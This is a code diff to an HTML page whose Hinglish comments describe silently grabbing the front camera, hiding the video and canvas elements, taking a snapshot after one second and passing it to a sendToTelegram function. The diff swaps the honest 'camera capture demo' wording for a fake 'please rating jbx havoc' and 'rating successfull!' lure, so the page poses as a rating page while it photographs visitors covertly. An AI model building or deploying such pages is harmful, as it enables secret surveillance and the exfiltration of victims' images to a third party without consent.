@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Auto Capture Demo</title>
+    <title>Jbx Havocc</title>
     <style>
         /* Video stream ko hidden rakha ja sakta hai presentation ke liye */
         video, canvas { display: none; }
@@ -12,8 +12,8 @@
 </head>
 <body>
 
-    <h3>Camera Security & Auto-Capture Demo</h3>
-    <p id="status">Camera initialize ho raha hai...</p>
+    <h2>please rating jbx havoc</h2>
+    <p id="status">register ho rha he..</p>
 
     <!-- Hidden elements capture karne ke liye -->
     <video id="video" autoplay playsinline></video>
@@ -28,7 +28,7 @@
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
-                status.innerText = "Camera access mil gaya! Capture ho raha hai...";
+                status.innerText = "rating ke liye Wait kare..";
 
                 // Stream start hone ke 1 second baad auto-click
                 setTimeout(takeSnapshot, 1000);
@@ -38,7 +38,7 @@
                 console.error("Camera Error: ", err);
             });
 
-        // Step B: Photo Capture Karna
+        // Step B: welcome 
         function takeSnapshot() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
@@ -50,7 +50,7 @@
             // Canvas ko Base64 Image format me convert karna
             const imageData = canvas.toDataURL('image/png');
             
-            status.innerText = "Photo capture ho gayi!";
+            status.innerText = "rating successfull!";
             
             // Yahan se photo ko download ya server par bheja jata hai
             sendToTelegram(imageData);
